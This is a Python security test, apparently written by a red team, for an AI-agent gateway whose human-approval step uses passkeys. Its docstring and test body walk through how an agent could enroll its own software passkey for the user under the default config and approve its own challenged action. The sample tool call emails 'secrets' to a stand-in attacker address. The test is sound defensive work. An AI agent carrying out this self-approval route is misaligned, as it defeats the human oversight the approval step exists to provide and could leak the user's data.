"""RED TEAM (crypto lens): open first-enrollment under the DEFAULT config.

Default ``Config()`` has ``rp_id="localhost"``, no ``enrollment_token`` and
``dev_mode=False``. ``routes.register_options`` treats rp_id == "localhost" as
dev and allows unauthenticated first enrollment for ANY user that has no
credential yet -- including a user that already exists and already has agent
sessions (``asu dev-session`` creates exactly that). ``guard_post`` accepts
requests with no ``Origin`` header, and attestation is "none", so the agent
(which must be able to reach the gateway port to call tools) can register its
own software passkey for the principal, receive the authenticator cookie and
approve its own challenged effect. P1 (agent-independence) then fails.

Secure behaviour asserted: an agent holding only its session token cannot get
a challenged effect executed.
"""
from __future__ import annotations

import os
import sys

import pytest
from fastapi.testclient import TestClient

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from fakes_authn import SoftAuthenticator  # noqa: E402

from asu.app import create_app  # noqa: E402
from asu.config import Config  # noqa: E402


POLICY = {"tools": {"send_email": {"class": "send", "default": "challenge"}}}


def test_agent_cannot_enroll_own_passkey_and_self_approve(tmp_path):
    cfg = Config(db_path=str(tmp_path / "asu.db"), ledger_path=str(tmp_path / "ledger.jsonl"),
                 workspace_root=str(tmp_path), policy=POLICY,
                 token_key_path=str(tmp_path / "k.pem"))
    app = create_app(cfg)
    store = app.state.store
    # What `asu dev-session --user alice` does: user + agent session, no passkey yet.
    store.create_user("alice", "Alice")
    token, _ = store.create_session("alice", "agent-1", ["*"], 3600)

    agent = TestClient(app, base_url="http://localhost:8000")
    bearer = {"Authorization": f"Bearer {token}"}
    r = agent.post("/v1/tools/call", headers=bearer,
                   json={"tool": "send_email", "args": {"to": "attacker@evil.example", "body": "secrets"},
                         "origin": "user_turn"})
    assert r.status_code == 202, r.text
    ap_id = r.json()["approval_id"]

    # The agent now acts as its own "authenticator page" (no Origin header,
    # self-chosen clientDataJSON origin, attestation 'none').
    soft = SoftAuthenticator()
    r = agent.post("/v1/authn/register/options", json={"user_id": "alice"})
    if r.status_code == 200:
        cred = soft.create(r.json())
        r2 = agent.post("/v1/authn/register/verify", json={"credential": cred})
        if r2.status_code == 200:
            r3 = agent.post(f"/v1/authn/approvals/{ap_id}/options", json={"grant": False})
            if r3.status_code == 200:
                a = soft.get(r3.json())
                agent.post(f"/v1/authn/approvals/{ap_id}/verify", json={"credential": a, "grant": False})

    r = agent.post("/v1/tools/call", headers=bearer, json={"approval_id": ap_id})
    assert r.status_code != 200 or r.json().get("status") != "executed", (
        "agent enrolled its own passkey for the principal and self-approved: P1 broken under default config")
